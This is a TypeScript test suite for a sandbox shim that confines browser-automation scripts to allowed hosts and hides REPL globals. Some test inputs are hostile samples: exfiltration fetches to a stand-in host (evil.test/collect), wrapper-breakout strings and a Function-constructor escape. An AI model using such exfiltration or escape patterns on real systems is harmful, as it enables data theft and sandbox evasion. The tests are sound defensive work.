import ts from "typescript";
import vm from "node:vm";
import { describe, expect, it } from "vitest";
import { FakeAsideRepl, SECRET } from "../../../test/support/fake-aside-repl.js";
import type { ShimOp } from "./shim.js";
import {
  buildGuardCsp,
  buildIsolatedGuard,
  buildMainWorldGuard,
  buildReplCode,
  checkPageScript,
  parseReplOutput,
  shadowParams,
} from "./shim.js";

const HOSTS = ["example.com"];

function ctx(nonce: string) {
  return { nonce, hostnames: HOSTS, deadlineMs: 5000, notBefore: 0, minIntervalMs: 0, instanceId: "t3st" };
}

/** Shadow list including the vm context's own extra builtins, as the port's retry would. */
function paramsFor(repl: FakeAsideRepl): string[] {
  const names = vm.runInContext("Object.getOwnPropertyNames(globalThis)", repl.context) as string[];
  return shadowParams(names);
}

async function runOp(repl: FakeAsideRepl, op: ShimOp) {
  const nonce = `n${Math.random().toString(36).slice(2)}`;
  const res = await repl.call({ title: "t", code: buildReplCode(op, ctx(nonce)), timeoutMs: 10_000 });
  return { res, envelope: parseReplOutput(res.text, nonce) };
}

/** Runs a script WITHOUT the static scan, to test the runtime layer on its own. */
async function runRaw(
  repl: FakeAsideRepl,
  script: string,
  targetId: string | null = null,
  args: unknown = null,
) {
  return runOp(repl, { kind: "script", targetId, script, args: args as null, params: paramsFor(repl) });
}

describe("buildReplCode", () => {
  it("is a single awaited async IIFE with no top-level declarations", () => {
    const code = buildReplCode(
      {
        kind: "script",
        targetId: null,
        script: "const x = 1; return x;",
        args: null,
        params: shadowParams(),
      },
      ctx("abc"),
    );
    // `export {}` makes it a module so a top-level `await` parses as an await expression.
    const sf = ts.createSourceFile(
      "repl.mjs",
      `${code}\nexport {};`,
      ts.ScriptTarget.ES2022,
      true,
      ts.ScriptKind.JS,
    );
    expect((sf as unknown as { parseDiagnostics?: unknown[] }).parseDiagnostics ?? []).toEqual([]);
    expect(sf.statements).toHaveLength(2);
    const stmt = sf.statements[0]!;
    expect(ts.isExpressionStatement(stmt)).toBe(true);
    expect(ts.isAwaitExpression((stmt as ts.ExpressionStatement).expression)).toBe(true);
  });

  it("can run twice in one persistent scope (fresh names every call)", async () => {
    const repl = new FakeAsideRepl();
    const a = await runRaw(repl, "return 1;");
    const b = await runRaw(repl, "return 2;");
    expect(a.envelope).toMatchObject({ ok: true, value: 1 });
    expect(b.envelope).toMatchObject({ ok: true, value: 2 });
  });
});

describe("checkPageScript", () => {
  const params = shadowParams();

  it("accepts a valid body and rejects a syntax error", () => {
    expect(checkPageScript("const a = await Promise.resolve(1); return a + 1;", params)).toEqual({
      ok: true,
    });
    const bad = checkPageScript("return (", params);
    expect(bad.ok).toBe(false);
  });

  it("rejects a body that tries to close the wrapper function early", () => {
    const breakout = "return 1;\n};\n__x = 1;\nconst y = async function () {\n";
    const r = checkPageScript(breakout, params);
    expect(r.ok).toBe(false);
    const breakout2 = "}); console.log('escaped'); (async () => {";
    expect(checkPageScript(breakout2, params).ok).toBe(false);
  });

  it("rejects redeclaring a shadowed name, as the REPL would", () => {
    expect(checkPageScript("let page = 1; return page;", params).ok).toBe(false);
  });

  it("rejects forbidden identifiers before compiling", () => {
    const r = checkPageScript("return fs.readFile('x')", params);
    expect(r).toMatchObject({
      ok: false,
      reason: expect.stringContaining('forbidden identifier "fs"') as string,
    });
  });
});

describe("REPL runtime (shim) in a fake Aside REPL", () => {
  it("shadows fs, aside, the skill globals, and tab attachment with undefined", async () => {
    const repl = new FakeAsideRepl();
    const { envelope } = await runRaw(
      repl,
      `return [typeof fs, typeof aside, typeof require, typeof process, typeof exec, typeof memory_search,
        typeof gmail, typeof applePasswords, typeof globalThis, typeof Function, typeof Reflect, typeof tabs,
        typeof listBrowserTabs, typeof attachBrowserTab, typeof attachActiveBrowserTab, typeof getTabByTargetId,
        typeof Buffer, typeof page, typeof console.log];`,
    );
    expect(envelope).toMatchObject({ ok: true });
    const value = (envelope as { value: string[] }).value;
    expect(value.slice(0, 17).every((t) => t === "undefined")).toBe(true);
    expect(value[17]).toBe("undefined"); // no session tab → no page (never the REPL's global page)
    expect(value[18]).toBe("function"); // a silent console
  });

  it("pins Function constructors so a runtime-built key cannot reach the REPL globals", async () => {
    const repl = new FakeAsideRepl();
    const { envelope } = await runRaw(
      repl,
      `const k = ["con", "struc", "tor"].join("");
       const F = (async () => {})[k] || (() => {})[k];
       if (F) { const g = await F("return this")(); return g && g.fs ? g.fs.secret : "no fs"; }
       return "blocked";`,
    );
    expect(envelope).toMatchObject({ ok: true, value: "blocked" });
  });

  it("has no access to the user's tab through page, tabs, or attach helpers", async () => {
    const repl = new FakeAsideRepl();
    const { envelope } = await runRaw(
      repl,
      "return typeof page === 'undefined' && typeof attachActiveBrowserTab === 'undefined';",
    );
    expect(envelope).toMatchObject({ ok: true, value: true });
    expect(repl.userTab.navigations).toEqual([]);
  });

  it("rejects a cross-host fetch even when the script catches the error", async () => {
    const repl = new FakeAsideRepl();
    const { envelope } = await runRaw(
      repl,
      `try { await fetch("https://evil.test/collect?d=1"); } catch (e) { return "caught"; } return "sent";`,
    );
    expect(envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "fetch", host: "evil.test" }],
    });
    expect(repl.fetchLog).toEqual([]);
  });

  it("allows a same-host fetch, follows same-host redirects, and drops set-cookie", async () => {
    const repl = new FakeAsideRepl();
    repl.responses.set("https://example.com/a", { status: 302, headers: { location: "/b" } });
    repl.responses.set("https://www.example.com/b", { status: 200, body: "unused" });
    repl.responses.set("https://example.com/b", {
      status: 200,
      headers: { "set-cookie": "sid=1", "content-type": "text/html" },
      body: "hello",
    });
    const { envelope } = await runRaw(
      repl,
      `const r = await fetch("https://example.com/a"); return { s: r.status, u: r.url, t: await r.text(), c: r.headers.get("set-cookie"), ct: r.headers.get("content-type") };`,
    );
    expect(envelope).toMatchObject({
      ok: true,
      value: { s: 200, u: "https://example.com/b", t: "hello", c: null, ct: "text/html" },
    });
    expect(repl.fetchLog.map((f) => f.redirect)).toEqual(["manual", "manual"]);
  });

  it("blocks a redirect that leaves the site's hostnames", async () => {
    const repl = new FakeAsideRepl();
    repl.responses.set("https://example.com/out", {
      status: 301,
      headers: { location: "https://evil.test/" },
    });
    const { envelope } = await runRaw(repl, `return (await fetch("https://example.com/out")).status;`);
    expect(envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "redirect", host: "evil.test" }],
    });
    expect(repl.fetchLog.map((f) => f.url)).toEqual(["https://example.com/out"]);
  });

  it("opens tabs only on the site's hostnames, filters them before the first load, and closes them after the script", async () => {
    const repl = new FakeAsideRepl();
    const cross = await runRaw(repl, `await openTab("https://evil.test/"); return 1;`);
    expect(cross.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "openTab", host: "evil.test" }],
    });
    expect(repl.pages.size).toBe(0);

    const ok = await runRaw(repl, `const p = await openTab("https://example.com/x"); return p.url();`);
    expect(ok.envelope).toMatchObject({ ok: true, value: "https://example.com/x" });
    const opened = repl.cdpLog.map((c) => c.method);
    expect(opened.slice(0, 4)).toEqual([
      "Network.setBlockedURLs",
      "Network.setBypassServiceWorker",
      "Page.addScriptToEvaluateOnNewDocument",
      "Page.addScriptToEvaluateOnNewDocument",
    ]);
    expect(repl.pages.size).toBe(0); // closed when the script ended
    expect(repl.closedTabs).toHaveLength(1);
  });

  it("blocks cross-host page.goto and keeps same-host navigation", async () => {
    const repl = new FakeAsideRepl();
    const tab = await runOp(repl, { kind: "open", url: "https://example.com/" });
    const id = (tab.envelope as { value: { targetId: string } }).value.targetId;
    const same = await runRaw(
      repl,
      `await page.goto("https://www.example.com/next"); return page.url();`,
      id,
    );
    expect(same.envelope).toMatchObject({ ok: true, value: "https://www.example.com/next" });
    const cross = await runRaw(
      repl,
      `try { await page.goto("https://evil.test/"); } catch (e) {} return page.url();`,
      id,
    );
    expect(cross.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "navigation", host: "evil.test" }],
    });
    expect(repl.pages.get(id)!.navigations).not.toContain("https://evil.test/");
  });

  async function openTab(repl: FakeAsideRepl, url = "https://example.com/"): Promise<string> {
    const tab = await runOp(repl, { kind: "open", url });
    return (tab.envelope as { value: { targetId: string } }).value.targetId;
  }

  it("installs the request filter, service-worker bypass, isolated-world guard, and main-world guard before the first load", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const page = repl.pages.get(id)!;
    expect(page.bypassServiceWorker).toBe(true);
    expect(page.initScripts.map((i) => i.worldName)).toEqual(["bridge_t3st", undefined]);
    expect(page.initScripts[0]!.source).toContain("securitypolicyviolation");
    expect(page.initScripts[1]!.source).toContain('"open"');
    expect(page.navigations).toEqual(["https://example.com/"]);
  });

  it("fails the step when an in-page request to another host was blocked (e.g. from page.evaluate)", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const r = await runRaw(
      repl,
      `return await page.evaluate(async () => {
         const out = {};
         try { out.same = (await fetch("https://example.com/api")).status; } catch (e) { out.same = String(e); }
         try { out.cross = (await fetch("https://evil.test/x")).status; } catch (e) { out.cross = String(e); }
         return out;
       });`,
      id,
    );
    expect(r.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "request", host: "evil.test" }],
    });
    expect(repl.pageRequests).toEqual(["https://example.com/api"]);
  });

  it("blocks and reports a page-script request to a captcha vendor host like any other host (never widened)", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const r = await runRaw(
      repl,
      `return await page.evaluate(async () => {
         try { await fetch("https://geo.captcha-delivery.com/captcha/?c=1"); } catch (e) {}
         try { await fetch("https://www.google.com/recaptcha/api.js"); } catch (e) {}
         return 1;
       });`,
      id,
    );
    expect(r.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [
        { kind: "request", host: "geo.captcha-delivery.com" },
        { kind: "request", host: "www.google.com" },
      ],
    });
    expect(repl.pageRequests).toEqual([]);
    const allowed = repl.pages.get(id)!.blockPatterns.filter((p) => !p.block);
    expect(allowed.some((p) => /captcha|google/.test(p.urlPattern))).toBe(false);
  });

  it("fails the step on an in-page cross-host navigation, WebSocket, or window.open", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const nav = await runRaw(
      repl,
      `await page.evaluate(() => { location.href = "https://evil.test/"; }); return page.url();`,
      id,
    );
    expect(nav.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "navigation", host: "evil.test" }],
    });
    expect(repl.pages.get(id)!.url()).toBe("https://example.com/");
    const ws = await runRaw(
      repl,
      `await page.evaluate(() => { new WebSocket("wss://evil.test/socket"); }); return 1;`,
      id,
    );
    expect(ws.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "request", host: "evil.test" }],
    });
    const pop = await runRaw(
      repl,
      `return await page.evaluate(() => String(open("https://evil.test/p")));`,
      id,
    );
    expect(pop.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "popup", host: "evil.test" }],
    });
  });

  it("does not fail the step for requests the page's own scripts made (blocked silently, reported as pageBlocked)", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    repl.pages.get(id)!.guardStore.push({ kind: "request", host: "ads.test", attributed: false });
    const r = await runRaw(repl, "return await page.title();", id);
    expect(r.envelope).toMatchObject({ ok: true, value: "Untitled", pageBlocked: ["ads.test"] });
  });

  it("reads the guard stores of child frames too", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    repl.pages.get(id)!.childFrameStore = [{ kind: "request", host: "evil.test", attributed: true }];
    const r = await runRaw(repl, "return 1;", id);
    expect(r.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "request", host: "evil.test" }],
    });
  });

  it("closes popups opened from a bridge tab and fails the step when they left the site", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const viaOpener = repl.spawnPopup("https://evil.test/a", { opener: id });
    const viaTabs = repl.spawnPopup("https://evil2.test/b", { attach: true });
    const r = await runRaw(repl, "return 1;", id);
    expect(r.envelope).toMatchObject({ ok: false, kind: "violation" });
    const hosts = (r.envelope as { violations: Array<{ kind: string; host: string }> }).violations.map(
      (v) => `${v.kind}:${v.host}`,
    );
    expect(hosts.sort()).toEqual(["popup:evil.test", "popup:evil2.test"]);
    expect(repl.pages.has(viaOpener.targetId)).toBe(false);
    expect(repl.pages.has(viaTabs.targetId)).toBe(false);
    expect(repl.pages.has("USER-TAB") || repl.targets.some((t) => t.targetId === "USER-TAB")).toBe(true);
  });

  it("closes an in-site popup without failing, and never touches unrelated or about:blank tabs", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const inSite = repl.spawnPopup("https://www.example.com/p", { opener: id });
    const unrelated = repl.spawnPopup("https://evil.test/user-opened"); // no opener link, not in the REPL session
    const blank = repl.spawnPopup("about:blank", { attach: true }); // may be a tab another call is opening
    const r = await runRaw(repl, "return 1;", id);
    expect(r.envelope).toMatchObject({ ok: true, value: 1 });
    expect(repl.pages.has(inSite.targetId)).toBe(false);
    expect(repl.pages.has(unrelated.targetId)).toBe(true);
    expect(repl.pages.has(blank.targetId)).toBe(true);
    expect(repl.closedTargets).not.toContain("USER-TAB");
  });

  it("sweeps popups when a bridge tab is closed", async () => {
    const repl = new FakeAsideRepl();
    const id = await openTab(repl);
    const late = repl.spawnPopup("https://example.com/late", { attach: true });
    await runOp(repl, { kind: "close", targetId: id });
    expect(repl.pages.has(late.targetId)).toBe(false);
    expect(repl.pages.has(id)).toBe(false);
  });

  it("sends a tab that lands off-site (server redirect) to about:blank and fails the call", async () => {
    const repl = new FakeAsideRepl();
    repl.redirects.set("https://example.com/login", "https://sso.other.test/login");
    const r = await runOp(repl, { kind: "open", url: "https://example.com/login" });
    expect(r.envelope).toMatchObject({
      ok: false,
      kind: "violation",
      violations: [{ kind: "navigation", host: "sso.other.test" }],
    });
    expect(repl.pages.size).toBe(0); // the new tab was closed
  });

  it("hides Aside internals behind the membrane", async () => {
    const repl = new FakeAsideRepl();
    const tab = await runOp(repl, { kind: "open", url: "https://example.com/" });
    const id = (tab.envelope as { value: { targetId: string } }).value.targetId;
    const r = await runRaw(
      repl,
      `const k = "_sendTo" + "Target";
       const leaked = [page.cdp, page.browser, page.frameManager, page.events, page.context, page[k],
         page.goto.call, page.goto.apply, page.goto.bind, page.goto.constructor, Object.getPrototypeOf(page)];
       let assigned = "no";
       try { page.goto = () => 1; assigned = String(page.goto === undefined); } catch (e) { assigned = "threw"; }
       return { leaked: leaked.map((x) => x === undefined || x === null), keys: Object.keys(page), assigned };`,
      id,
    );
    expect(r.envelope).toMatchObject({ ok: true });
    const value = (r.envelope as { value: { leaked: boolean[]; keys: string[]; assigned: string } }).value;
    expect(value.leaked.every(Boolean)).toBe(true);
    expect(value.keys).not.toContain("cdp");
    expect(JSON.stringify(value)).not.toContain(SECRET);
  });

  it("lets scripts annotate evaluate() results without touching the originals", async () => {
    const repl = new FakeAsideRepl();
    const tab = await runOp(repl, { kind: "open", url: "https://example.com/" });
    const id = (tab.envelope as { value: { targetId: string } }).value.targetId;
    const r = await runRaw(
      repl,
      `const rows = await page.evaluate(() => [{ a: 1 }, { a: 2 }]);
       for (const row of rows) row.b = row.a * 10;
       return rows.map((row) => ({ ...row }));`,
      id,
    );
    expect(r.envelope).toMatchObject({
      ok: true,
      value: [
        { a: 1, b: 10 },
        { a: 2, b: 20 },
      ],
    });
  });

  it("applies the politeness gate to navigations inside a script", async () => {
    const repl = new FakeAsideRepl();
    const tab = await runOp(repl, { kind: "open", url: "https://example.com/" });
    const id = (tab.envelope as { value: { targetId: string } }).value.targetId;
    const nonce = "polite";
    const start = Date.now();
    const code = buildReplCode(
      {
        kind: "script",
        targetId: id,
        script: `await page.goto("https://example.com/1"); await page.goto("https://example.com/2"); return 1;`,
        args: null,
        params: paramsFor(repl),
      },
      { ...ctx(nonce), notBefore: start + 150, minIntervalMs: 150 },
    );
    const res = await repl.call({ title: "t", code, timeoutMs: 10_000 });
    const env = parseReplOutput(res.text, nonce);
    expect(env).toMatchObject({ ok: true });
    const elapsed = Date.now() - start;
    expect(elapsed).toBeGreaterThanOrEqual(290);
    expect((env as { lastLoadAt: number }).lastLoadAt).toBeGreaterThanOrEqual(start + 290);
  });

  it("reports a script error without page content in logs (message only in the envelope)", async () => {
    const repl = new FakeAsideRepl();
    const { envelope } = await runRaw(repl, `throw new Error("no results table");`);
    expect(envelope).toMatchObject({ ok: false, kind: "script", message: "no results table" });
  });

  it("reports unshadowed globals instead of running the script", async () => {
    const repl = new FakeAsideRepl();
    vm.runInContext("globalThis.newSkill = { secret: 1 }", repl.context);
    const nonce = "g1";
    const code = buildReplCode(
      {
        kind: "script",
        targetId: null,
        script: "return typeof newSkill;",
        args: null,
        params: shadowParams(),
      },
      ctx(nonce),
    );
    const res = await repl.call({ title: "t", code, timeoutMs: 10_000 });
    const env = parseReplOutput(res.text, nonce);
    expect(env).toMatchObject({ ok: false, kind: "globals" });
    expect((env as { names: string[] }).names).toContain("newSkill");
  });

  it("ignores the bridge's own registry globals (e.g. from another port instance)", async () => {
    const repl = new FakeAsideRepl();
    vm.runInContext(
      "Object.defineProperty(globalThis, '__brbTabs_other', { value: new Set() })",
      repl.context,
    );
    const { envelope } = await runRaw(repl, "return 5;");
    expect(envelope).toMatchObject({ ok: true, value: 5 });
  });

  it("enforces the in-REPL deadline", async () => {
    const repl = new FakeAsideRepl();
    const nonce = "slow";
    const code = buildReplCode(
      {
        kind: "script",
        targetId: null,
        script: "await new Promise(() => {}); return 1;",
        args: null,
        params: paramsFor(repl),
      },
      { ...ctx(nonce), deadlineMs: 50 },
    );
    const res = await repl.call({ title: "t", code, timeoutMs: 10_000 });
    expect(parseReplOutput(res.text, nonce)).toMatchObject({ ok: false, kind: "timeout" });
  });
});

/** Minimal DOM stand-in to execute the in-page guard sources. */
function guardWorld(url: string) {
  type L = (e: unknown) => void;
  const listeners: Record<string, L[]> = {};
  const add = (type: string, fn: L) => {
    (listeners[type] ??= []).push(fn);
  };
  const head = { prepended: [] as unknown[], prepend: (el: unknown) => head.prepended.push(el) };
  const anchors: Array<Record<string, unknown>> = [];
  const document = {
    readyState: "complete",
    head,
    documentElement: head,
    addEventListener: add,
    createElement: () => ({ httpEquiv: "", content: "" }),
    querySelectorAll: () => anchors,
  };
  const observers: Array<(records: unknown[]) => void> = [];
  class MutationObserver {
    constructor(cb: (records: unknown[]) => void) {
      observers.push(cb);
    }
    observe() {}
  }
  const anchor = (href: string, target: string) => {
    const attrs: Record<string, string> = { target };
    const el: Record<string, unknown> = {
      nodeType: 1,
      tagName: "A",
      href,
      hasAttribute: (n: string) => n in attrs,
      getAttribute: (n: string) => attrs[n] ?? null,
      removeAttribute: (n: string) => delete attrs[n],
      querySelectorAll: () => [],
    };
    return el;
  };
  const window: Record<string, unknown> = {
    addEventListener: add,
    navigation: { addEventListener: add },
    open: () => "real-open",
    SharedWorker: function () {},
  };
  const dispatched: Array<{ type: string; detail: unknown }> = [];
  class Navigator {}
  Object.defineProperty(Navigator.prototype, "serviceWorker", { configurable: true, get: () => ({}) });
  class EventTarget {
    dispatchEvent(e: { type: string; detail: unknown }) {
      dispatched.push(e);
      return true;
    }
  }
  class CustomEvent {
    constructor(
      readonly type: string,
      init: { detail: unknown },
    ) {
      this.detail = init.detail;
    }
    detail: unknown;
  }
  const ctx = vm.createContext({
    window,
    document,
    location: { href: url },
    URL,
    Navigator,
    EventTarget,
    CustomEvent,
    MutationObserver,
  });
  window["window"] = window;
  const fire = (type: string, e: unknown) => (listeners[type] ?? []).forEach((fn) => fn(e));
  return { ctx, window, head, fire, dispatched, anchors, anchor, observers };
}

describe("in-page guards", () => {
  it("builds a CSP that limits connections, frames, workers, and subresources to the site's hosts", () => {
    const csp = buildGuardCsp(["example.com"]);
    for (const d of [
      "connect-src",
      "frame-src",
      "child-src",
      "worker-src",
      "img-src",
      "script-src",
      "form-action",
    ]) {
      expect(csp).toMatch(new RegExp(`${d} example\\.com \\*\\.example\\.com`));
    }
    expect(csp).toContain("object-src 'none'");
  });

  it("isolated guard: cancels and records off-site navigations, records attributed CSP violations, installs the CSP", () => {
    const w = guardWorld("https://example.com/");
    vm.runInContext(buildIsolatedGuard(["example.com"], "t3st"), w.ctx);
    expect(w.head.prepended).toHaveLength(1);
    let prevented = 0;
    w.fire("navigate", {
      destination: { url: "https://evil.test/x?secret=1" },
      cancelable: true,
      preventDefault: () => prevented++,
    });
    w.fire("navigate", {
      destination: { url: "https://www.example.com/ok" },
      cancelable: true,
      preventDefault: () => prevented++,
    });
    w.fire("securitypolicyviolation", {
      disposition: "enforce",
      blockedURI: "https://evil.test",
      sourceFile: "",
    });
    w.fire("securitypolicyviolation", {
      disposition: "enforce",
      blockedURI: "https://ads.test",
      sourceFile: "https://example.com/app.js",
    });
    w.fire("bridge-guard-t3st", { detail: "popup|1|https://evil.test/popup" });
    w.fire("bridge-guard-t3st", { detail: "request|0|https://pixel.test/p.gif" });
    expect(prevented).toBe(1);
    const drained = vm.runInContext("__bridgeDrain()", w.ctx) as unknown[];
    expect(drained).toEqual([
      { kind: "navigation", host: "evil.test", attributed: true },
      { kind: "request", host: "evil.test", attributed: true },
      { kind: "request", host: "ads.test", attributed: false },
      { kind: "popup", host: "evil.test", attributed: true },
      { kind: "request", host: "pixel.test", attributed: false },
    ]);
    expect(vm.runInContext("__bridgeDrain()", w.ctx)).toEqual([]);
  });

  it("isolated guard: strips target=_blank from off-site links (Aside opens those itself, bypassing DOM events)", () => {
    const w = guardWorld("https://example.com/");
    const off = w.anchor("https://evil.test/x", "_blank");
    const on = w.anchor("https://www.example.com/y", "_blank");
    w.anchors.push(off, on);
    vm.runInContext(buildIsolatedGuard(["example.com"], "t3st"), w.ctx);
    expect((off["hasAttribute"] as (n: string) => boolean)("target")).toBe(false);
    expect((on["hasAttribute"] as (n: string) => boolean)("target")).toBe(true);
    const later = w.anchor("https://evil.test/z", "_blank");
    w.observers.forEach((cb) => cb([{ type: "childList", addedNodes: [later] }]));
    expect((later["hasAttribute"] as (n: string) => boolean)("target")).toBe(false);
  });

  it("main-world guard: reports a blocked open from a child frame to the top window", () => {
    const w = guardWorld("https://example.com/");
    const topDispatched: string[] = [];
    w.window["top"] = { document: {}, __marker: "top" };
    vm.runInContext(
      "EventTarget.prototype.dispatchEvent = function (e) { if (this && this.__marker === 'top') __top.push(e.detail); return true; };",
      w.ctx,
    );
    (w.ctx as Record<string, unknown>)["__top"] = topDispatched;
    vm.runInContext(buildMainWorldGuard(["example.com"], "t3st"), w.ctx);
    expect((w.window["open"] as (u: string) => unknown)("https://evil.test/p")).toBeNull();
    expect(topDispatched).toEqual(["popup|1|https://evil.test/p"]);
  });

  it("main-world guard: reports off-site image/script/media loads and EventSource set from injected code", () => {
    const w = guardWorld("https://example.com/");
    const sets: string[] = [];
    const proto = () => {
      const P = function () {} as unknown as { prototype: object };
      Object.defineProperty(P.prototype, "src", {
        configurable: true,
        set: (v: string) => sets.push(v),
        get: () => "",
      });
      return P;
    };
    const ctx = w.ctx as Record<string, unknown>;
    ctx["HTMLImageElement"] = proto();
    ctx["HTMLScriptElement"] = proto();
    ctx["EventSource"] = function (this: { u: string }, u: string) {
      this.u = u;
    };
    ctx["Element"] = { prototype: { setAttribute: (n: string, v: string) => sets.push(`${n}=${v}`) } };
    vm.runInContext(buildMainWorldGuard(["example.com"], "t3st"), w.ctx);
    vm.runInContext(
      `const img = Object.create(HTMLImageElement.prototype); img.src = "https://evil.test/i.png";
       img.src = "https://www.example.com/ok.png";
       new EventSource("https://evil.test/es");
       Element.prototype.setAttribute.call({ tagName: "IMG" }, "src", "https://evil.test/a.png");
       Element.prototype.setAttribute.call({ tagName: "A" }, "href", "https://evil.test/link");`,
      w.ctx,
    );
    expect(w.dispatched.map((e) => e.detail)).toEqual([
      "request|1|https://evil.test/i.png",
      "request|1|https://evil.test/es",
      "request|1|https://evil.test/a.png",
    ]);
    expect(sets).toContain("https://evil.test/i.png"); // the load itself is left to the request filter
  });

  it("main-world guard: disables window.open (reporting off-site attempts) and service workers", () => {
    const w = guardWorld("https://example.com/");
    vm.runInContext(buildMainWorldGuard(["example.com"], "t3st"), w.ctx);
    const open = w.window["open"] as (u: string) => unknown;
    expect(open("https://evil.test/p")).toBeNull();
    expect(open("https://example.com/p")).toBeNull();
    expect(w.dispatched.map((e) => [e.type, e.detail])).toEqual([
      ["bridge-guard-t3st", "popup|1|https://evil.test/p"],
    ]);
    expect(vm.runInContext("'serviceWorker' in Navigator.prototype", w.ctx)).toBe(false);
    expect(w.window["SharedWorker"]).toBeUndefined();
  });
});

describe("parseReplOutput", () => {
  it("finds the envelope among other REPL output lines", () => {
    const text = '✔︎ Opened a new tab\n@@BRB:abc@@{"ok":true,"value":1,"lastLoadAt":null}\n[system] done';
    expect(parseReplOutput(text, "abc")).toEqual({ ok: true, value: 1, lastLoadAt: null });
    expect(parseReplOutput(text, "other")).toBeNull();
    expect(parseReplOutput("@@BRB:abc@@{broken", "abc")).toBeNull();
  });
});
